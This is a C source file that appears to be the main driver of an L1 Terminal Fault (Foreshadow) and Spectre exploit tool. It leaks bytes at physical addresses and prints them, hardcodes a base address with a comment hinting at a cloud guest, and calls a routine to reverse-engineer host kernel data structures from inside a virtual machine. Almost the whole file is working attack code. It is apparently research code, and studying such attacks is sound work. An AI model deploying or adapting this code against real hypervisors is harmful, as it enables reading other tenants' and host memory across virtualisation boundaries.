#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"

void leak_and_print(uintptr_t base, uintptr_t pa, int nr_bytes)
{
	char *data = l1tf_leak(base, pa, nr_bytes);

	for (int i = 0; i < nr_bytes; i++) {
		printf("%02x ", (uint8_t)data[i]);
	}
	printf("\n");
	for (int i = 0; i < nr_bytes; i++) {
		printf("%c", isprint(data[i]) ? data[i] : '_');
	}
	printf("\n");

	free(data);
}

int main(void)
{
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();

	// void *p = l1tf_spawn_leak_page();
	// // uintptr_t pa = l1tf_find_page_pa(p);
	// uintptr_t pa = 0x403b765000; // gce?
	// printf("l1tf_find_page_pa --> %lx\n", pa);
	// l1tf_test(p, pa, 1000000);

	// uintptr_t base = l1tf_find_base();
	uintptr_t base = 0x88d43f218;
	// printf("l1tf_find_base --> %lx\n", base);
	// l1tf_test_base(base, 100000);

	// test_half_spectre(p, pa, base);

	// benchmark_leakage_primitive(base);


	reverse_host_kernel_data_structures();


	return 0;
}
